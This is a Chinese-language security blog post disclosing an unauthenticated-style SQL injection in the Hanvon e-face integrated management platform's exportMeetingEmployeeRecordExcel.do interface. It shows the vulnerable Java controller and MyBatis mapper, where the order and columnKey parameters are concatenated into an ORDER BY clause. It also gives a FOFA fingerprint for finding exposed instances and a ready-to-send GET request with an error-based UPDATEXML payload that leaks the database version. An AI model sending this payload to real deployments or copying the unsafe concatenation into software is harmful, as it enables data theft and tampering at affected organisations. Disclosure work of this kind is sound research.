---
title: "汉王e脸通综合管理平台 exportMeetingEmployeeRecordExcel.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-exportMeetingEmployeeRecordExcel-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-exportmeetingemployeerecordexcel.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 exportMeetingEmployeeRecordExcel.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/7 08:23
- 574浏览
- [0评论](#comment)
- 47分钟阅读

深入探索

安全工具开发

JSON处理工具

漏洞扫描器

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `exportMeetingEmployeeRecordExcel.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

安全运维咨询

在线安全工具

Nessus

直接看 `MobiMeetingAppController` 里关于 `exportMeetingEmployeeRecordExcel` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"exportMeetingEmployeeRecordExcel.do"},
        method = {RequestMethod.GET}
    )
    public MethodResult exportMeetingEmployeeRecordExcel(@RequestParam(required = true,value = "meetingId") Long meetingId, @RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "name") String name, @RequestParam(required = false,value = "department") Long department, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order, @RequestHeader(required = false,value = "token") String token, @RequestParam(required = false,value = "state") Integer state, HttpServletResponse response) {
        MethodResult methodResult = new MethodResult();
        MethodResult rst = this.getTokenUser(token);
        if (rst.isSuccess()) {
            UserTpm user = (UserTpm)rst.getResult();

            try {
                if (page == null) {
                    page = Constants.DEFAULT_START_PAGE_INDEX;
                }

                if (pageSize == null) {
                    pageSize = 9999;
                }

                MeetingEmployeeParam param = new MeetingEmployeeParam();
                param.setMtId(meetingId);
                param.setMeName(name);
                param.setMeDepartment(department);
                if (state != null) {
                    if (state == 5) {
                        param.setMeLeaveEarly((byte)3);
                    } else if (state == 6) {
                        param.setMeLeaveEarly((byte)1);
                    } else {
                        param.setMeSigninState(state.byteValue());
                    }
                }

                param.setColumnKey(columnKey);
                param.setOrder(order);
                PageHelper.startPage(page, pageSize);
                List<MeetingEmployeeTpm> list = this.meetingAsm.queryMeetingEmployee(param);
                MeetingTpm meeting = this.meetingAsm.getMeetingById(meetingId);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 MeetingEmployeeDsm.xml

代码安全审计

```
<!--查询参会人员列表-->
  <select id="queryMeetingEmployee" parameterType="com.hanvon.iface.tpm.meeting.param.MeetingEmployeeParam" resultMap="ResultMapVO">
    select MME.ID, MME.MT_ID, MME.ME_ID, MME.ME_NUMBER, MME.ME_NAME, MME.ME_SIGNIN_STATE, MME.ME_SIGNIN_TIME,
    MME.ME_SIGNIN_PATH ,SB.SZ_NAME AS MEDEPARTMENTNAME,MME.ME_ISSUE_STATE AS MEISSUESTATE,MME.ME_SIGNOUT_TIME,ME_LEAVE_EARLY,su.sz_photo_path as photoPath
    from mt_meeting_employee MME
    LEFT JOIN SYS_BRANCH SB ON MME.ME_DEPARTMENT = SB.NG_ID
    LEFT JOIN sys_user su on MME.ME_ID =  su.ng_id
    where MME.MT_ID = #{mtId}
    <if test="meName != null and meName != ''">
      and MME.ME_NAME like CONCAT('%',#{meName},'%')
    </if>
    <if test="meDepartment != null">
      and SB.NG_ID = #{meDepartment}
    </if>
    <if test="meSigninState != null">
      and MME.ME_SIGNIN_STATE = #{meSigninState}
    </if>
    <if test="meLeaveEarly != null">
      and MME.ME_LEAVE_EARLY = #{meLeaveEarly}
    </if>
    <if test="meSigninStateList != null">
      and MME.ME_SIGNIN_STATE IN
      <foreach collection="meSigninStateList" item="meSigninStateList" index="index" open="(" separator="," close=")">
        #{meSigninStateList}
      </foreach>
    </if>
    <if test="meDate != null">
      and MME.ME_SIGNIN_TIME &gt; #{meDate,jdbcType=VARCHAR}
    </if>
    ORDER BY
    <if test="order == null or order == ''">
      MME.ME_SIGNIN_TIME desc
    </if>
    <if test="order != null and order != ''">
      ${columnKey} ${order}
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

> 需要一个合法的 token，参考 [wxLogin.do 信息泄露](https://mrxn.net/jswz/hanvon-efacego-wxLogin-auth-bypass-data-leak.html)获取
>
> 需要 meetingId 参数存在
>
> 漏洞修复方案

```
GET /manage/mobiMeetingApp/exportMeetingEmployeeRecordExcel.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&meetingId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
token: xxxxxx
```

[![汉王e脸通综合管理平台 exportMeetingEmployeeRecordExcel.do SQL注入漏洞](images/img-001-8f7276a10f97.webp)](https://image.mrxn.net/77b3864fb3234531a4ebdcb31aa0030b.webp)

成功通过报错注入爆出数据库版本信息

物流软件安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
